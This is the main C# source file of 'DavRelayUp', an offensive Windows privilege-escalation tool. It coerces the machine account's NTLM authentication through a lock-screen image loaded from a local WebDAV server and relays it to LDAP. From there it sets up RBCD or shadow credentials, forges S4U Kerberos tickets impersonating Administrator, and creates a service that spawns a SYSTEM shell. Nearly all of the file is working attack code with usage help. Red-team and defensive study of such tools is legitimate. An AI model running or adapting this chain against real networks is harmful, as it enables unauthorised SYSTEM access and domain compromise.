using System;
using System.IO;
using System.DirectoryServices.Protocols;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using Windows.Storage;
using System.Text;
using System.Security.Principal;

namespace DavRelayUp
{
    public static class Options
    {

        public enum PhaseType
        {
            System = 0,
            Relay = 1,
            Spawn = 2,
            KrbSCM = 3,
            Full = 4
        }

        public enum RelayAttackType
        {
            RBCD = 1,
            ShadowCred = 2,
            // ADCS = 3
        }

        // General Options
        public static string domain = null;
        public static string domainDN = "";
        public static string domainController = null;
        public static bool useSSL = false;
        public static int ldapPort = 389;
        public static bool useCreateNetOnly = false;
        public static string netOnlyCommand = null;
        public static bool verbose = false;
        public static PhaseType phase = PhaseType.Full;
        public static string httpPrefix = "http://*:5357/";

        // Relay Options
        public static RelayAttackType relayAttackType = RelayAttackType.RBCD;
        public static bool attackDone = false;

        // RBCD Method
        public static bool rbcdCreateNewComputerAccount = false;
        public static string rbcdComputerName = "DAVRELAYUP";
        public static string rbcdComputerPassword = null;
        public static string rbcdComputerPasswordHash = null;
        public static string rbcdComputerSid = null;

        // SHADOWCRED Method
        public static bool shadowCredForce = false;
        public static string shadowCredCertificate = null;
        public static string shadowCredCertificatePassword = null;

        // ADCS Method
        // public static string caEndpoint = null;
        // public static bool https = false;
        // public static string certificateTemplate = "Machine";

        // Spawn Options
        public static string impersonateUser = "Administrator";
        public static string targetSPN = $"HOST/{Environment.MachineName.ToUpper()}";
        public static string targetDN = "";

        // KRBSCM Options
        public static string serviceName = "KrbSCM";
        public static string serviceCommand = null;

        public static Windows.Storage.Streams.IRandomAccessStream oldImageStream;
        public static void PrintOptions()
        {
            var allPublicFields = typeof(Options).GetFields();
            foreach (var opt in allPublicFields)
            {
                Console.WriteLine($"{opt.Name}:{opt.GetValue(null)}");
            }
        }

    }

    class Program
    {

        public static void GetHelp()
        {
            Console.WriteLine("FULL: Perform full attack chain. Options are identical to RELAY. Tool must be on disk.");
            Console.WriteLine("");
            Console.WriteLine("RELAY: First phase of the attack. Will coerce NTLM auth from local machine account, relay it to LDAP and create a control primitive over the local machine using RBCD or SHADOWCRED.");
            Console.WriteLine("Usage: DavRelayUp.exe relay -d FQDN -cn COMPUTERNAME [-c] [-cp PASSWORD | -ch NTHASH]\n");
            Console.WriteLine("    -m   (--Method)                   Abuse method to use in after a successful relay to LDAP <rbcd/shadowcred> (default=rbcd)");
            Console.WriteLine("");
            Console.WriteLine("    # RBCD Method:");
            Console.WriteLine("    -c   (--CreateNewComputerAccount) Create new computer account for RBCD. Will use the current authenticated user.");
            Console.WriteLine("    -cn  (--ComputerName)             Name of attacker owned computer account for RBCD. (default=DAVRELAYUP$)");
            Console.WriteLine("    -cp  (--ComputerPassword)         Password of computer account for RBCD. (default=RANDOM [if -c is enabled])");
            Console.WriteLine("");
            Console.WriteLine("    # SHADOWCRED Method:");
            Console.WriteLine("    -f   (--ForceShadowCred)          Clear the msDS-KeyCredentialLink attribute of the attacked computer account before adding our new shadow credentials. (Optional)");
            Console.WriteLine("");
            //Console.WriteLine("    # ADCS Method:");
            //Console.WriteLine("    -ca  (--CAEndpoint)               CA endpoint FQDN (default = same as DC)");
            //Console.WriteLine("    -https                            Connect to CA endpoint over secure HTTPS instead of HTTP");
            //Console.WriteLine("    -cet (--CertificateTemplate)      Certificate template to request for (default=Machine)");

            Console.WriteLine("\n");
            Console.WriteLine("SPAWN: Second phase of the attack. Will use the appropriate control primitive to obtain a Kerberos Service Ticket and will use it to create a new service running as SYSTEM.");
            Console.WriteLine("Usage: DavRelayUp.exe spawn -d FQDN -cn COMPUTERNAME [-cp PASSWORD | -ch NTHASH] <-i USERTOIMPERSONATE>\n");
            Console.WriteLine("    -m   (--Method)                   Abuse method used in RELAY phase <rbcd/shadowcred> (default=rbcd)");
            Console.WriteLine("    -i   (--Impersonate)              User to impersonate. should be a local administrator in the target computer. (default=Administrator)");
            Console.WriteLine("    -nc  (--NetOnlyCommand)           Command to run with the obtained TGS, used for KrbSCM creation. Override this if the tool is not on disk. (default = <current path> krbscm -s <service name> -sc <service command>)");
            Console.WriteLine("    -s   (--ServiceName)              Name of the service to be created. (default=KrbSCM)");
            Console.WriteLine("    -sc  (--ServiceCommand)           Service command [binPath]. (default = spawn cmd.exe as SYSTEM)");
            Console.WriteLine("");
            Console.WriteLine("    # RBCD Method:");
            Console.WriteLine("    -cn  (--ComputerName)             Name of attacker owned computer account for RBCD. (default=DAVRELAYUP$)");
            Console.WriteLine("    -cp  (--ComputerPassword)         Password of computer account for RBCD. (either -cp or -ch must be specified)");
            Console.WriteLine("    -ch  (--ComputerPasswordHash)     Password NT hash of computer account for RBCD. (either -cp or -ch must be specified)");
            Console.WriteLine("");
            //Console.WriteLine("    # SHADOWCRED | ADCS Method:");
            Console.WriteLine("    # SHADOWCRED Method:");
            Console.WriteLine("    -ce  (--Certificate)              Base64 encoded certificate or path to certificate file");
            Console.WriteLine("    -cep (--CertificatePassword)      Certificate password (if applicable)");

            Console.WriteLine("\n");
            Console.WriteLine("KRBSCM: Will use the currently loaded Kerberos Service Ticket to create a new service running as SYSTEM.");
            Console.WriteLine("Usage: DavRelayUp.exe krbscm <-s SERVICENAME> <-sc SERVICECOMMANDLINE>\n");
            Console.WriteLine("    -s  (--ServiceName)              Name of the service to be created. (default=KrbSCM)");
            Console.WriteLine("    -sc (--ServiceCommand)           Service command [binPath]. (default = spawn cmd.exe as SYSTEM)");

            Console.WriteLine("\n");
            Console.WriteLine("General Options:");
            Console.WriteLine($"    -l  (--Listen)                   Address to start WebDAV listener on. Make sure it is available to the current user. (Optional, default: {Options.httpPrefix})");
            Console.WriteLine("    -d  (--Domain)                   FQDN of domain. (Optional)");
            Console.WriteLine("    -dc (--DomainController)         FQDN of domain controller. (Optional)");
            Console.WriteLine("    -ssl                             Use LDAP over SSL. (Optional)");
            Console.WriteLine("    -n                               Use CreateNetOnly (needs to be on disk) instead of PTT when importing ST (enabled if using FULL mode)");
            Console.WriteLine("    -v  (--Verbose)                  Show verbose output. (Optional)");


            Console.WriteLine("");
        }

        static void ParseArgs(string[] args)
        {

            if (args.Length == 0)
            {
                GetHelp();
                Environment.Exit(0);
            }

            if (!Enum.TryParse<Options.PhaseType>(args[0], true, out Options.phase))
            {
                GetHelp();
                Console.WriteLine($"\n[-] Unrecognized Phase Type \"{args[0]}\"");
                Environment.Exit(0);
            }

            // General Options
            int iDomain = Array.FindIndex(args, s => new Regex(@"(?i)(-|--)(d|Domain)$").Match(s).Success);
            int iDomainController = Array.FindIndex(args, s => new Regex(@"(?i)(-|--)(dc|DomainController)$").Match(s).Success);
            int iListen = Array.FindIndex(args, s => new Regex(@"(?i)(-|--)(l|Listen)$").Match(s).Success);
            int iSSL = Array.FindIndex(args, s => new Regex(@"(?i)(-|--)(ssl)$").Match(s).Success);
            int iCreateNetOnly = Array.FindIndex(args, s => new Regex(@"(?i)(-|--)(n|CreateNetOnly)$").Match(s).Success);
            int iVerbose = Array.FindIndex(args, s => new Regex(@"(?i)(-|--)(v|Verbose)$").Match(s).Success);
            Options.domain = (iDomain != -1) ? args[iDomain + 1] : Options.domain;
            Options.httpPrefix = (iListen != -1) ? args[iListen + 1] : Options.httpPrefix;
            if (!Options.httpPrefix.ToLower().StartsWith("http://"))
            {
                Console.WriteLine("[-] http:// scheme required");
                Environment.Exit(0);
            }
            
            try {
                // Replace wildcards just for parsing
                var uri = new Uri(Options.httpPrefix.Replace("://+", "://example.com").Replace("://*", "://example.com"));
                if (uri.Host.ToLower() == "localhost" || uri.Host.StartsWith("127.")) {
                    Console.WriteLine("[-] Attack will not work with loopback interface!");
                    Environment.Exit(0);
                }
            } catch
            {
                Console.WriteLine($"[-] {Options.httpPrefix} is not a valid listen address");
                Environment.Exit(0);
            }

            if (!Options.httpPrefix.EndsWith("/"))
            {
                Console.WriteLine($"[*] Note: trailing slash is missing in '{Options.httpPrefix}', adding it");
                Options.httpPrefix += "/";
            }

            Options.domainController = (iDomainController != -1) ? args[iDomainController + 1] : Options.domainController;
            Options.useSSL = (iSSL != -1) ? true : Options.useSSL;
            if (Options.useSSL)
                Options.ldapPort = 636;
            Options.useCreateNetOnly = (iCreateNetOnly != -1) ? true : Options.useCreateNetOnly;
            Options.verbose = (iVerbose != -1) ? true : Options.verbose;

            // Relay Options
            int iMethod = Array.FindIndex(args, s => new Regex(@"(?i)(-|--)(m|Method)$").Match(s).Success);
            if (iMethod != -1)
            {
                if (!Enum.TryParse<Options.RelayAttackType>(args[iMethod + 1], true, out Options.relayAttackType))
                {
                    GetHelp();
                    Console.WriteLine($"\n[-] Unrecognized RELAY attack type \"{args[iMethod + 1]}\"");
                    Environment.Exit(0);
                }
            }

            // RBCD Method
            int iCreateNewComputerAccount = Array.FindIndex(args, s => new Regex(@"(?i)(-|--)(c|CreateNewComputerAccount)$").Match(s).Success);
            int iComputerName = Array.FindIndex(args, s => new Regex(@"(?i)(-|--)(cn|ComputerName)$").Match(s).Success);
            int iComputerPassword = Array.FindIndex(args, s => new Regex(@"(?i)(-|--)(cp|ComputerPassword)$").Match(s).Success);
            int iComputerPasswordHash = Array.FindIndex(args, s => new Regex(@"(?i)(-|--)(ch|ComputerPasswordHash)$").Match(s).Success);
            Options.rbcdCreateNewComputerAccount = (iCreateNewComputerAccount != -1) ? true : Options.rbcdCreateNewComputerAccount;
            Options.rbcdComputerName = (iComputerName != -1) ? args[iComputerName + 1].TrimEnd('$') : Options.rbcdComputerName;
            Options.rbcdComputerPassword = (iComputerPassword != -1) ? args[iComputerPassword + 1] : Options.rbcdComputerPassword;
            Options.rbcdComputerPasswordHash = (iComputerPasswordHash != -1) ? args[iComputerPasswordHash + 1] : Options.rbcdComputerPasswordHash;

            // SHADOWCRED Method
            int iShadowCredForce = Array.FindIndex(args, s => new Regex(@"(?i)(-|--)(f|ForceShadowCred)$").Match(s).Success);
            int iShadowCredCertificate = Array.FindIndex(args, s => new Regex(@"(?i)(-|--)(ce|Certificate)$").Match(s).Success);
            int iShadowCredCertificatePassword = Array.FindIndex(args, s => new Regex(@"(?i)(-|--)(cep|CertificatePassword)$").Match(s).Success);
            Options.shadowCredForce = (iShadowCredForce != -1) ? true : Options.shadowCredForce;
            Options.shadowCredCertificate = (iShadowCredCertificate != -1) ? args[iShadowCredCertificate + 1] : Options.shadowCredCertificate;
            Options.shadowCredCertificatePassword = (iShadowCredCertificatePassword != -1) ? args[iShadowCredCertificatePassword + 1] : Options.shadowCredCertificatePassword;

            // ADCS Method
            /*int iCAEndpoint = Array.FindIndex(args, s => new Regex(@"(?i)(-|--)(ca|CAEndpoint)$").Match(s).Success);
            int iHttps = Array.FindIndex(args, s => new Regex(@"(?i)(-|--)(https)$").Match(s).Success);
            int iCertificateTemplate = Array.FindIndex(args, s => new Regex(@"(?i)(-|--)(cet|CertificateTemplate)$").Match(s).Success);
            Options.caEndpoint = (iCAEndpoint != -1) ? args[iCAEndpoint + 1] : Options.caEndpoint;
            if (!String.IsNullOrEmpty(Options.caEndpoint))
            {
                try
                {
                    //Options.caEndpoint = new Uri(Options.caEndpoint).Host; <- This somewhat messed with the execuutionflow when a users enters httpx://server.domain.bla/bla
                    //new method with regex insted of Uri.host method
                    Options.caEndpoint = Regex.Replace(Options.caEndpoint, @"^([a-zA-Z]+:\/\/)?([^\/]+)\/.*?$", "$2");
                }
                catch { }
            }
            Options.https = (iHttps != -1) ? true : Options.https;
            Options.certificateTemplate = (iCertificateTemplate != -1) ? args[iCertificateTemplate + 1] : Options.certificateTemplate;
            */
            // Spawn Options
            int iImpersonateUser = Array.FindIndex(args, s => new Regex(@"(?i)(-|--)(i|Impersonate)$").Match(s).Success);
            Options.impersonateUser = (iImpersonateUser != -1) ? args[iImpersonateUser + 1] : Options.impersonateUser;

            int iNetOnlyCommand = Array.FindIndex(args, s => new Regex(@"(?i)(-|--)(nc|NetOnlyCommand)$").Match(s).Success);
            Options.netOnlyCommand = (iNetOnlyCommand != -1) ? args[iNetOnlyCommand + 1] : Options.netOnlyCommand;

            // KRBSCM Options
            int iServiceName = Array.FindIndex(args, s => new Regex(@"(?i)(-|--)(s|ServiceName)$").Match(s).Success);
            int iServiceCommand = Array.FindIndex(args, s => new Regex(@"(?i)(-|--)(sc|ServiceCommand)$").Match(s).Success);
            Options.serviceName = (iServiceName != -1) ? args[iServiceName + 1] : Options.serviceName;
            Options.serviceCommand = (iServiceCommand != -1) ? args[iServiceCommand + 1] : Options.serviceCommand;

        }

        static async Task<byte[]> GetDefaultLockScreenImage()
        {
            StorageFile defaultImage = null;
            try
            {
                defaultImage = await StorageFile.GetFileFromPathAsync("C:\\Windows\\Web\\Screen\\img100.jpg");
            }
            catch
            {
                Console.WriteLine("Unable to open default lock screen image");
                return null;
            }

            if (defaultImage == null)
                return null;

            var stream = await defaultImage.OpenSequentialReadAsync();
            try
            {
                using (MemoryStream ms = new MemoryStream())
                {
                    stream.AsStreamForRead().CopyTo(ms);
                    return ms.ToArray();
                }
            }
            catch
            {
                Console.WriteLine("Unable to read default lock screen image");
                return null;
            }
        }


        public async static Task RelayTask()
        {
            var imgBytes = await GetDefaultLockScreenImage();
            var server = new Relay.HttpServer(Options.httpPrefix, imgBytes);
            try
            {
                server.Start();
            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] Unable to start WebDAV server: {e.Message}");
                Console.WriteLine("[-] Make sure the listener prefix is available to the current user (netsh http show urlacl)");
                Environment.Exit(0);
            }

            Console.WriteLine($"[+] Started WebDAV server at {Options.httpPrefix}");
            var serverTask = Task.Run(() => server.HandleConnections());
            await Task.Delay(500);

            await UpdateLockScreen();
            await Task.WhenAny(Task.Run(() => Task.Delay(10000)), Task.Run(() => serverTask));
            server.Stop();
            try
            {
                await Windows.System.UserProfile.LockScreen.SetImageStreamAsync(Options.oldImageStream);
                Console.WriteLine("[+] Lock screen image restored");
            }
            catch
            {
                Console.WriteLine("[-] Windows Spotlight mode in use, lock screen image has to be restored manually");
            }

            if (!Options.attackDone)
            {
                Console.WriteLine("[-] Attack failed");
                await serverTask;
                return;
            }
        }


        static async Task UpdateLockScreen()
        {
            Options.oldImageStream = Windows.System.UserProfile.LockScreen.GetImageStream();
            StorageFile newImage;
            Uri uri = new Uri(Options.httpPrefix.Replace("://+", "://localhost").Replace("://*", "://localhost"));
            var path = uri.AbsolutePath.Replace("/", "\\");
            if (!path.EndsWith("\\"))
                path += "\\";
            string fullPath = $"\\\\{Environment.MachineName.ToUpper()}@{uri.Port}{path}{Path.GetRandomFileName().Replace(".", "")}\\screen.jpg";


            try
            {
                newImage = await StorageFile.GetFileFromPathAsync(fullPath);
            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] Unable to fetch lock screen image from WebDAV: {e.Message}");

                if (Options.verbose)
                {
                    Console.WriteLine(e.ToString());
                    Console.WriteLine("");
                }
                if (Relay.Natives.IsOS(Relay.Natives.OS_ANYSERVER))
                {
                    Console.WriteLine("[-] If you are running this on a server, make sure WebDAV-Redirector feature is enabled");
                    Console.WriteLine("[-] 'Get-WindowsFeature WebDAV-Redirector | Format-Table –Autosize'");
                } else
                {
                    Console.WriteLine("[-] Try again after 60 seconds");
                }
                Environment.Exit(0);
                return;
            }

            Console.WriteLine("[+] Setting lock screen image");
            await Windows.System.UserProfile.LockScreen.SetImageFileAsync(newImage);
        }

        public static string GetObjectSidForComputerName(LdapConnection ldapConnection, string computerName, string searchBase)
        {
            string searchFilter = $"(sAMAccountName={computerName}$)";
            SearchRequest searchRequest = new SearchRequest(searchBase, searchFilter, SearchScope.Subtree, "DistinguishedName", "objectSid");
            try
            {
                SearchResponse response = (SearchResponse)ldapConnection.SendRequest(searchRequest);
                return (new SecurityIdentifier((byte[])response.Entries[0].Attributes["objectSid"][0], 0)).ToString();
            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] Could not find computer account SID:");
                Console.WriteLine($"[-] {e.Message}");
                Environment.Exit(0);
            }
            return null;
        }


        static void Main(string[] args)
        {
            Console.WriteLine("DavRelayUp - Relaying you to SYSTEM but retro style\n");

            ParseArgs(args);

            if (Options.phase == Options.PhaseType.System)
            {
                try
                {
                    KrbSCM.RunSystemProcess(Convert.ToInt32(args[1]));
                }
                catch { }
                return;
            }
            else if (Options.phase == Options.PhaseType.KrbSCM)
            {
                KrbSCM.Run();
                return;
            }

            // If domain or dc is null try to find the them automatically
            if (String.IsNullOrEmpty(Options.domain) || String.IsNullOrEmpty(Options.domainController))
            {
                if (!Networking.GetDomainInfo())
                    return;
            }

            // Check if domain controller is an IP and if so try to resolve it to the DC FQDN
            if (!String.IsNullOrEmpty(Options.domainController))
            {
                Options.domainController = Networking.GetDCNameFromIP(Options.domainController);
                if (String.IsNullOrEmpty(Options.domainController))
                {
                    Console.WriteLine("[-] Could not find Domain Controller FQDN From IP. Try specifying the FQDN with --DomainController flag.");
                    return;
                }
            }


            if (Options.phase == Options.PhaseType.Relay || Options.phase == Options.PhaseType.Full)
            {
                Console.WriteLine();
                Options.domainDN = Networking.GetDomainDN(Options.domain);
                LdapDirectoryIdentifier identifier = new LdapDirectoryIdentifier(Options.domainController, Options.ldapPort);
                LdapConnection ldapConnection = new LdapConnection(identifier);

                // spoppi make SSL work 
                if (Options.useSSL)
                {
                    ldapConnection.SessionOptions.ProtocolVersion = 3;
                    ldapConnection.SessionOptions.SecureSocketLayer = true;
                }
                else // test showed that these options are mutually exclusive
                {
                    ldapConnection.SessionOptions.Sealing = true;
                    ldapConnection.SessionOptions.Signing = true;
                }

                ldapConnection.Bind();

                if (Options.relayAttackType == Options.RelayAttackType.RBCD)
                {
                    // Create new computer account if flag is enabled
                    if (Options.rbcdCreateNewComputerAccount)
                    {
                        // Generate random passowrd for the new computer account if not specified
                        if (String.IsNullOrEmpty(Options.rbcdComputerPassword))
                            Options.rbcdComputerPassword = Relay.Helpers.RandomPasswordGenerator(16);

                        AddRequest request = new AddRequest();
                        request.DistinguishedName = $"CN={Options.rbcdComputerName},CN=Computers,{Options.domainDN}";
                        request.Attributes.Add(new DirectoryAttribute("objectClass", "Computer"));
                        request.Attributes.Add(new DirectoryAttribute("SamAccountName", $"{Options.rbcdComputerName}$"));
                        request.Attributes.Add(new DirectoryAttribute("userAccountControl", "4096"));
                        request.Attributes.Add(new DirectoryAttribute("DnsHostName", $"{Options.rbcdComputerName}.{Options.domain}"));
                        request.Attributes.Add(new DirectoryAttribute("ServicePrincipalName", $"HOST/{Options.rbcdComputerName}.{Options.domain}", $"RestrictedKrbHost/{Options.rbcdComputerName}.{Options.domain}", $"HOST/{Options.rbcdComputerName}", $"RestrictedKrbHost/{Options.rbcdComputerName}"));
                        request.Attributes.Add(new DirectoryAttribute("unicodePwd", Encoding.Unicode.GetBytes($"\"{Options.rbcdComputerPassword}\"")));

                        try
                        {
                            DirectoryResponse res = ldapConnection.SendRequest(request);
                            Console.WriteLine($"[+] Computer account \"{Options.rbcdComputerName}$\" added with password \"{Options.rbcdComputerPassword}\"");
                        }
                        catch (Exception e)
                        {
                            Console.WriteLine($"[-] Could not add new computer account:");
                            Console.WriteLine($"[-] {e.Message}");
                            return;
                        }
                    }

                    // Get Computer SID for RBCD
                    Options.rbcdComputerSid = GetObjectSidForComputerName(ldapConnection, Options.rbcdComputerName, Options.domainDN);

                }
                RelayTask().Wait();
            }

            if (Options.phase == Options.PhaseType.Spawn || (Options.phase == Options.PhaseType.Full && Options.attackDone))
            {
                byte[] bFinalTicket = null;
                if (Options.relayAttackType == Options.RelayAttackType.RBCD)
                {
                    Interop.KERB_ETYPE eType = new Interop.KERB_ETYPE();
                    string hash = null;

                    if (!String.IsNullOrEmpty(Options.rbcdComputerPassword))
                    {
                        string salt = $"{Options.domain.ToUpper()}host{Options.rbcdComputerName.ToLower()}.{Options.domain.ToLower()}";
                        hash = Crypto.KerberosPasswordHash(Interop.KERB_ETYPE.aes256_cts_hmac_sha1, Options.rbcdComputerPassword, salt);
                        eType = Interop.KERB_ETYPE.aes256_cts_hmac_sha1;
                    }
                    else if (!String.IsNullOrEmpty(Options.rbcdComputerPasswordHash))
                    {
                        hash = Options.rbcdComputerPasswordHash;
                        eType = Interop.KERB_ETYPE.rc4_hmac;
                    }

                    byte[] bInnerTGT = AskTGT.TGT($"{Options.rbcdComputerName}$", Options.domain, hash, eType, outfile: null, ptt: false);
                    if (bInnerTGT == null)
                        return;
                    KRB_CRED TGT = new KRB_CRED(bInnerTGT);
                    if (Options.verbose)
                        Console.WriteLine($"[+] VERBOSE: Base64 TGT for {Options.rbcdComputerName}$:\n    {Convert.ToBase64String(TGT.RawBytes)}\n");

                    KRB_CRED elevateTicket = S4U.S4U2Self(TGT, Options.impersonateUser, Options.targetSPN, outfile: null, ptt: false);
                    if (elevateTicket == null)
                        return;
                    if (Options.verbose)
                        Console.WriteLine($"[+] VERBOSE: Base64 TGS for {Options.impersonateUser} to {Options.rbcdComputerName}$@{Options.domain}:\n    {Convert.ToBase64String(elevateTicket.Encode().Encode())}\n");

                    bFinalTicket = S4U.S4U2Proxy(TGT, Options.impersonateUser, Options.targetSPN, outfile: null, ptt: (Options.phase != Options.PhaseType.Full), tgs: elevateTicket);
                    if (Options.verbose)
                        Console.WriteLine($"[+] VERBOSE: Base64 TGS for {Options.impersonateUser} to {Options.targetSPN}:\n    {Convert.ToBase64String(bFinalTicket)}\n");
                }
                else if (Options.relayAttackType == Options.RelayAttackType.ShadowCred)
                {
                    byte[] bInnerTGT = AskTGT.TGT($"{Environment.MachineName}$", Options.domain, Options.shadowCredCertificate, Options.shadowCredCertificatePassword, Interop.KERB_ETYPE.aes256_cts_hmac_sha1, outfile: null, ptt: false, getCredentials: Options.verbose);
                    if (bInnerTGT == null)
                        return;
                    KRB_CRED TGT = new KRB_CRED(bInnerTGT);
                    if (Options.verbose)
                        Console.WriteLine($"\n[+] VERBOSE: Base64 TGT for {Environment.MachineName}$:\n    {Convert.ToBase64String(TGT.RawBytes)}\n");

                    KRB_CRED elevateTicket = S4U.S4U2Self(TGT, Options.impersonateUser, Options.targetSPN, outfile: null, ptt: false);
                    if(elevateTicket == null)
                        return;

                    if (Options.verbose)
                        Console.WriteLine($"[+] VERBOSE: Base64 TGS for {Options.impersonateUser} to {Options.rbcdComputerName}$@{Options.domain}:\n    {Convert.ToBase64String(elevateTicket.Encode().Encode())}\n");

                    bFinalTicket = LSA.SubstituteTGSSname(elevateTicket, Options.targetSPN, ptt: (Options.phase != Options.PhaseType.Full));
                    if (Options.verbose)
                        Console.WriteLine($"[+] VERBOSE: Base64 TGS for {Options.impersonateUser} to {Options.targetSPN}:\n    {Convert.ToBase64String(bFinalTicket)}\n");
                }

                System.Threading.Thread.Sleep(1500);

                if (Options.phase == Options.PhaseType.Full || Options.useCreateNetOnly)
                {
                    string finalCommand = $"{System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName} krbscm";
                    if (!String.IsNullOrEmpty(Options.serviceName))
                        finalCommand = $"{finalCommand} --ServiceName \"{Options.serviceName}\"";
                    if (!String.IsNullOrEmpty(Options.serviceCommand))
                        finalCommand = $"{finalCommand} --ServiceCommand \"{Options.serviceCommand}\"";
                    if (Options.netOnlyCommand != null)
                    {
                        Console.WriteLine("[*] --NetOnlyCommand override requested");
                        Console.WriteLine($"[*] To get the SYSTEM shell, run '{finalCommand}' in context of the created process");
                        finalCommand = Options.netOnlyCommand;
                    }
                    Helpers.CreateProcessNetOnly(finalCommand, show: false, kirbiBytes: bFinalTicket);
                }
                else
                {
                    KrbSCM.Run();
                }

            }
        }
    }
}